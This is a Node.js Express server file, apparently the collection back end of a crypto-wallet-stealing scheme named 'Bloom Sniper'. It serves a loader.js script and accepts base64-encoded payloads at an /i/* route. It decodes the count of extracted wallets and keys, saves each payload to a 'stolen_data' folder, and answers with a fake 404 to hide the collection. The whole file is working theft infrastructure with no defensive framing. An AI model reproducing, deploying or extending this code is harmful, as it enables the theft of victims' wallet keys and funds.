const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

console.log('========================================');
console.log('🚀 Bloom Sniper Backend Starting on Railway...');
console.log('========================================');

// 1. Static files middleware - MUST come BEFORE routes
const publicPath = path.join(__dirname, 'public');
console.log('Serving static files from:', publicPath);

app.use('/axiom', express.static(path.join(publicPath, 'axiom')));

// Test route to confirm loader.js is being served
app.get('/axiom/loader.js', (req, res) => {
  const filePath = path.join(publicPath, 'axiom', 'loader.js');
  console.log('✅ Direct /axiom/loader.js request - serving file:', filePath);
  res.sendFile(filePath);
});

// 2. Data receiving route
app.get('/i/*', (req, res) => {
  console.log('🚀 /i/* DATA RECEIVED!');
  console.log('Full URL:', req.originalUrl);
  console.log('URL Length:', req.originalUrl.length);
  console.log('IP:', req.ip);

  let encodedData = req.params[0] || '';
  if (!encodedData && req.originalUrl.includes('/i/')) {
    encodedData = req.originalUrl.split('/i/')[1] || '';
  }

  console.log('Encoded data length:', encodedData.length);

  if (!encodedData || encodedData.length < 20) {
    console.log('❌ No data in URL');
    return res.status(404).json({ detail: "Not Found" });
  }

  try {
    const decodedStr = Buffer.from(encodedData, 'base64').toString('utf-8');
    const payload = JSON.parse(decodedStr);

    console.log('✅ PAYLOAD DECODED SUCCESSFULLY');
    console.log('Wallets:', payload.walletsExtracted || payload.keys?.length || 0);

    const dir = path.join(__dirname, 'stolen_data');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });

    const filename = `stolen_${Date.now()}.json`;
    fs.writeFileSync(path.join(dir, filename), JSON.stringify(payload, null, 2));

    console.log(`💾 SAVED: stolen_data/${filename}`);
  } catch (err) {
    console.error('❌ DECODE ERROR:', err.message);
  }

  res.status(404).json({ detail: "Not Found" });
});

// 3. Clean catch-all (quiet for assets)
app.get('*', (req, res) => {
  const url = req.originalUrl;
  if (url.includes('/assets/') || url.match(/\.(svg|png|jpg|jpeg|gif|css|js)$/i)) {
    console.log('🖼️ Ignored asset 404:', url);
    return res.status(404).send('Not Found');
  }
  console.log('404 - Unknown route:', url);
  res.status(404).json({ detail: "Not Found" });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ SERVER LIVE ON PORT ${PORT}`);
  console.log(`📁 Loader should be at: https://bloom-sniper-replica-production.up.railway.app/axiom/loader.js`);
  console.log('========================================');
});